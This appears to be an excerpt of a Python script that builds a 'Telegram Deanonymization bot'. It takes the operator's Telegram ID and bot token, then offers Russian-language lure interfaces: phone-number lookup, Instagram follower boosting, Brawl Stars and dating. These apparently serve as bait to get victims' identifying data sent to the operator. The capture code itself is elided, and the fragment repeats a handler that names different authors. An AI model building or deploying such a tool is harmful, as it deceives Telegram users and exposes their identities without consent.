...
os.system('clear')
print(Fore.MAGENTA + ' _____    _   _   _   _ ' + Fore.YELLOW + ' __        ______   __      ')
print(Fore.MAGENTA + '|  __ \  | \ | | | \ | |' + Fore.YELLOW + '|  |      |  __  | |  |     ')
print(Fore.MAGENTA + '| |  | | |  \| | |  \| |' + Fore.YELLOW + '|  |      | |  | | |  |     ')
print(Fore.MAGENTA + '| |  | | | . ` | | . ` |' + Fore.YELLOW + '|  |   _  | |  | | |  |   _ ')
print(Fore.MAGENTA + '| |__| | | |\  | | |\  |' + Fore.YELLOW + '|  |__| | | |__| | |  |__| |')
print(Fore.MAGENTA + '|_____/  |_| \_| |_| \_|' + Fore.YELLOW + '|_______| |______| |_______|')
print(Fore.YELLOW + '-----------------------------------------')
print(Fore.YELLOW + '|' + Fore.BLUE +  " Telegram Deanonymization bot builder  " + Fore.YELLOW + '|')
print(Fore.YELLOW + '|' + Fore.BLUE +  "       Developer: @amonnius         " + Fore.YELLOW + '|')
print(Fore.YELLOW + '|' + Fore.BLUE +  "        Telegram: @amonnius         " + Fore.YELLOW + '|')
print(Fore.YELLOW + '-----------------------------------------')
userid = input(Fore.RED +  "Введите ваш Telegram ID > ")
token = input(Fore.BLUE +  "Введите токен бота > ")
print(Fore.CYAN + '''
[1] Пробив по номеру
[2] Накрутка в инстаграм
[3] Бравл старс
[4] Знакомства
	''')
choice = input(Fore.MAGENTA +  "Выберите вариант интерфейса:>>> ")
...
@bot.message_handler(commands=['amonnius'])
def start(message):
	bot.send_message(message.chat.id, 'Автор скрипта: @amonnius. Telegram: @amonnius') 
...
def proc2(message):
	try:
		...
		if int(num) > 1000:
			bot.reply_to(message, 'Колличество подписчиков не может быть более 1000!')
			return
...
@bot.message_handler(commands=['amonnius'])
def start(message):
	bot.send_message(message.chat.id, 'Автор скрипта: @lamer112311. Telegram: @amonnius') 
